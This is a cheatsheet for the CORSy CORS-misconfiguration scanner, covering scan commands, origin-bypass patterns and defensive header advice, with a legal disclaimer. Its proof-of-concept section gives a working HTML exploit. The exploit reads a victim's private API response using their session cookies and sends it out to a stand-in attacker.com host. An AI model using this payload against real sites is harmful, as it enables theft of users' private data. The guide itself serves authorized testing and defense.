# 🌐 CORSy - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```

<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Fast and comprehensive CLI tool designed to detect Cross-Origin Resource Sharing (CORS) misconfigurations and test for cross-origin data theft risks</b>
</p>

---

## 📋 Table of Contents

- [Overview & CORS Vulnerability Basics](#-overview--cors-vulnerability-basics)
  - [The Fatal Trio: Origin Reflection + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Installation](#-installation)
- [Basic Target Scanning](#-basic-target-scanning)
- [CORS Attack Vectors Tested](#-cors-attack-vectors-tested)
  - [Arbitrary Origin Reflection](#arbitrary-origin-reflection)
  - [Trusting Null Origin (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Prefix & Suffix Regex Bypass](#prefix--suffix-regex-bypass)
  - [Wildcard Subdomain Trust](#wildcard-subdomain-trust)
  - [Special Character Bypass (`_`, `;`, `!`)](#special-character-bypass----)
- [Multi-Target Scanning & Output Export](#-multi-target-scanning--output-export)
- [Crafting Proof-of-Concept (PoC) Exploits](#-crafting-proof-of-concept-poc-exploits)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Secure Headers](#-defensive-considerations--secure-headers)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & CORS Vulnerability Basics

**Cross-Origin Resource Sharing (CORS)** is a browser security mechanism that allows web servers to relax the **Same-Origin Policy (SOP)**. By returning headers such as:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

A web application grants other websites permission to read its HTTP responses on behalf of the victim user.

### The Fatal Trio: Origin Reflection + Credentials True
When an application blindly reflects the incoming `Origin` header in `Access-Control-Allow-Origin` and enables `Access-Control-Allow-Credentials: true`, any malicious website can force an authenticated visitor's browser to read private messages, API keys, and account details.

Created by **Somdev Sangwan (s0md3v)**, **CORSy** systematically probes endpoints with 16+ known origin permutations to spot these misconfigurations.

---

## 📥 Installation

```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```

---

## 🚀 Basic Target Scanning

Scan a single web application endpoint:

```bash
python3 corsy.py -u https://target.com/api/user/details
```

Add custom headers or session cookies:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```

---

## ⚡ CORS Attack Vectors Tested

CORSy automatically tests several origin permutation patterns:

### Arbitrary Origin Reflection
The server blindly mirrors any domain:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Trusting Null Origin (`Origin: null`)
Applications may trust `null` origins (common with local sandboxed iframes or `data:` URLs):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Can be triggered by loading the victim API from an iframe with `sandbox="allow-scripts allow-top-navigation"`.*

### Prefix & Suffix Regex Bypass
Poor regex validation (e.g. `.*target.com` or `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### Special Character Bypass (`_`, `;`, `!`)
Browsers and servers handle URI delimiters differently:
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 Multi-Target Scanning & Output Export

Scan large lists of API endpoints discovered from reconnaissance:

```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```

---

## 💻 Crafting Proof-of-Concept (PoC) Exploits

When CORSy confirms a misconfiguration with credentials allowed, generate an HTML exploit to steal sensitive data:

```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Scan Single URL** | `python3 corsy.py -u <URL>` |
| **Scan with Session Cookie** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Scan URL List** | `python3 corsy.py -i targets.txt` |
| **Multi-Threaded Scan** | `python3 corsy.py -i targets.txt -t 20` |
| **Export to JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Defensive Considerations & Secure Headers

1. **Never Reflect Origin Arbitrarily:** Compare the `Origin` header against an explicit, strict server-side whitelist.
2. **Never Pair Wildcard with Credentials:** The browser blocks `Access-Control-Allow-Origin: *` with `Credentials: true`, but never emulate it dynamically.
3. **Avoid Trusting `null`:** Do not add `null` to trusted origin policies.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> CORSy is intended strictly for authorized security assessments, penetration testing, and defensive auditing. Testing websites without authorization is illegal.
